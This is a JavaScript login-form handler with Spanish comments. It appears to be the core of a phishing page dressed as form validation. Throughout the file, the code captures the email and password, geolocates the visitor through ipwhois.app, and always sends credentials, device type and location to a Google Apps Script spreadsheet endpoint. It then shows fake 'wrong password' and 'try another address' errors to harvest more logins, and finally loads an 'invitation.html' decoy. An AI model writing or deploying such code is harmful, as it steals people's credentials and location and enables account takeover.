document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático 
    
    console.log("🔍 INICIANDO VALIDACIÓN DEL FORMULARIO");

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Verificar que los elementos existen
    if (!emailInput || !passwordInput) {
        console.error("❌ ERROR: No se encontraron los inputs del formulario");
        return;
    }
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["ejemplo1@correo.com"]; // Agregar correos prohibidos aquí
    const prohibitedWords = ["hola123"]; // Agregar contraseñas prohibidas aquí
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value.trim(); // Agregado trim para limpiar espacios
    
    console.log("📧 Email ingresado:", `"${email}"`);
    console.log("🔑 Contraseña ingresada:", `"${password}"`);
    console.log("📋 Emails prohibidos:", prohibitedEmails);
    console.log("📋 Contraseñas prohibidas:", prohibitedWords);
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        console.log("❌ Email inválido por formato");
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido (comparación exacta)
    const isProhibitedEmail = prohibitedEmails.includes(email);
    console.log("🚫 ¿Email prohibido?", isProhibitedEmail);
    
    // Verificar contraseña prohibida (comparación exacta)
    const isProhibitedPassword = prohibitedWords.includes(password);
    console.log("🚫 ¿Contraseña prohibida?", isProhibitedPassword);
    
    // ✅ Detectar si el usuario usa iPhone o Android
    let deviceType = "Otro"; // Valor por defecto
    if (/android/i.test(navigator.userAgent)) {
        deviceType = "Android";
    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
        deviceType = "iPhone";
    }
    
    // ✅ Obtener el país y la ciudad del usuario desde la API
    let country = "Desconocido";
    let city = "Desconocido";
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data) {
            if (data.country) {
                country = data.country;
            }
            if (data.city) {
                city = data.city;
            }
        }
    } catch (error) {
        console.error("Error obteniendo la ubicación:", error);
    }
    
    // ✅ Preparar datos para enviar
    const formData = new FormData(this);
    formData.append("device", deviceType);
    formData.append("country", country + " - " + city);
    
    // Agregar estado de validación para tracking
    let status = "Acceso exitoso";
    if (isProhibitedEmail) {
        status = "Email prohibido";
    } else if (isProhibitedPassword) {
        status = "Contraseña prohibida";
    }
    formData.append("status", status);
    
    console.log("📊 Estado asignado:", status);
    
    // ✅ SIEMPRE enviar los datos a Google Sheets
    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
    
    try {
        await fetch(url, {
            method: "POST",
            body: new URLSearchParams(formData),
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        });
        console.log("✅ Datos enviados a Google Sheets exitosamente");
    } catch (error) {
        console.error("❌ Error al enviar datos:", error);
    }
    
    // 🔥 VALIDACIONES CRÍTICAS - DEBEN DETENER LA EJECUCIÓN
    
    // PRIMERO: Verificar email prohibido
    if (isProhibitedEmail) {
        console.log("🚫 BLOQUEANDO: Email prohibido detectado");
        console.log("🛑 DETENIENDO EJECUCIÓN - NO REDIRIGIR");
        
        // Mostrar mensaje de error
        if (errorMessage) {
            errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
            errorMessage.style.color = 'red';
            errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
            errorMessage.style.display = 'block';
        }
        
        // Limpiar campos
        emailInput.value = '';
        passwordInput.value = '';
        
        // DETENER COMPLETAMENTE LA EJECUCIÓN
        console.log("🛑 RETURN EJECUTADO - FIN DE LA FUNCIÓN");
        return;
    }
    
    // SEGUNDO: Verificar contraseña prohibida
    if (isProhibitedPassword) {
        console.log("🚫 BLOQUEANDO: Contraseña prohibida detectada");
        console.log("🛑 DETENIENDO EJECUCIÓN - NO REDIRIGIR");
        
        // Mostrar mensaje de error
        if (errorMessage) {
            errorMessage.textContent = "Contraseña incorrecta";
            errorMessage.style.color = 'red';
            errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
            errorMessage.style.display = 'block';
        }
        
        // Limpiar solo la contraseña
        passwordInput.value = '';
        
        // DETENER COMPLETAMENTE LA EJECUCIÓN
        console.log("🛑 RETURN EJECUTADO - FIN DE LA FUNCIÓN");
        return;
    }
    
    // ✅ SOLO LLEGA AQUÍ SI NO HAY ERRORES
    console.log("✅ VALIDACIÓN EXITOSA - PROCEDIENDO CON REDIRECCIÓN");
    
    // Limpiar cualquier mensaje de error previo
    if (errorMessage) {
        errorMessage.textContent = "";
        errorMessage.style.display = 'none';
    }

    // Ocultar el formulario
    document.getElementById("miFormulario").style.display = "none";
    
    // Mostrar mensaje "Cargando..."
    let loadingMessage = document.createElement("p");
    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
    loadingMessage.style.textAlign = "center";
    document.body.appendChild(loadingMessage);
    
    // Antes de mostrar el iframe, ocultar el footer de folder.html
    const footerElement = document.querySelector("p");
    if (footerElement) {
        footerElement.style.display = "none";
    }

    // Mostrar el iframe
    let iframe = document.getElementById("usuarioFrame");
    if (iframe) {
        iframe.src = "invitation.html";
        iframe.style.display = "block";
        
        // Eliminar mensaje de carga después de mostrar usuario.html
        iframe.onload = function() {
            loadingMessage.remove();
        };
    }
    
    console.log("🎉 REDIRECCIÓN COMPLETADA");
});
